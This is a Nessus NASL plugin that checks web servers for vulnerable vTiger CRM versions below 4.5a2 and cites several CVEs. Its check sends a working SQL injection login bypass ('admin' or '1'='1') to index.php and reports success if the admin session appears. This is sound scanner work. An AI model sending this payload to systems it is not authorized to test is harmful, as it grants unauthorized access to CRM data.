#
# This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
# Ref: Christopher Kunz from Hardened-PHP Project & SEC-CONSULT
#
# This script is released under the GNU GPLv2
#


include("compat.inc");

if (description) {
script_id(20317);
script_cve_id("CVE-2005-3818", "CVE-2005-3819", "CVE-2005-3820", "CVE-2005-3821", "CVE-2005-3822", "CVE-2005-3823", "CVE-2005-3824");
script_bugtraq_id(15562, 15569);
script_xref(name:"OSVDB", value:"21225");
script_xref(name:"OSVDB", value:"21226");
script_xref(name:"OSVDB", value:"21227");
script_xref(name:"OSVDB", value:"21228");
script_xref(name:"OSVDB", value:"21229");
script_xref(name:"OSVDB", value:"21230");
script_xref(name:"OSVDB", value:"21232");
script_version("$Revision: 1.10 $");

script_name(english:"vTiger < 4.5a2 Multiple Vulnerabilities");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple flaws." );
 script_set_attribute(attribute:"description", value:
"The remote version of this software is prone to arbitrary code
execution, directory traversal, SQL injection (allowing authentication
bypass), cross-site scripting attacks." );
 script_set_attribute(attribute:"see_also", value:"http://www.hardened-php.net/advisory_232005.105.html" );
 script_set_attribute(attribute:"see_also", value:"https://www.sec-consult.com/files/20051125_vtiger_crm.txt" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to vtiger 4.5 alpha 2 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );

script_end_attributes();


script_summary(english:"Checks for authentication bypass in vTiger");
script_category(ACT_GATHER_INFO);
script_copyright(english:"This script is Copyright (C) 2005-2009 David Maciejak");
script_family(english:"CGI abuses");
script_dependencie("http_version.nasl");
script_require_ports("Services/www", 80);
script_exclude_keys("Settings/disable_cgi_scanning");

exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (! can_host_php(port:port) ) exit(0);

# Loop through various directories.
if (thorough_tests) dirs = list_uniq(make_list("/tigercrm", "/crm", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs) {
  res = http_get_cache(item:string(dir, "/index.php"), port:port);
  if (isnull(res)) exit(0);

  # If it looks like vtiger...
  if (
    'HREF="include/images/vtigercrm_icon.ico">' >< res ||
    "vtiger.com is not affiliated with nor endorsed by" >< res
  ) {

    filename = string(dir, "/index.php");
    variables = string("module=Users&action=Authenticate&return_module=Users&return_action=Login&user_name=admin%27+or+%271%27%3D%271&user_password=test&login_theme=blue&login_language=en_us&Login=++Login++");
    host=get_host_name();
    req = string(
      "POST ", filename, " HTTP/1.0\r\n", 
      "Referer: ","http://", host, filename, "\r\n",
      "Host: ", host, ":", port, "\r\n", 
      "Content-Type: application/x-www-form-urlencoded\r\n", 
      "Content-Length: ", strlen(variables), 
      "\r\n\r\n", 
      variables
    );
    result = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (isnull(result)) exit(0);

    if(
      # Link to My Account
      "?module=Users&action=DetailView&record=" >< result ||
      "New Contact" >< result
    ) {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
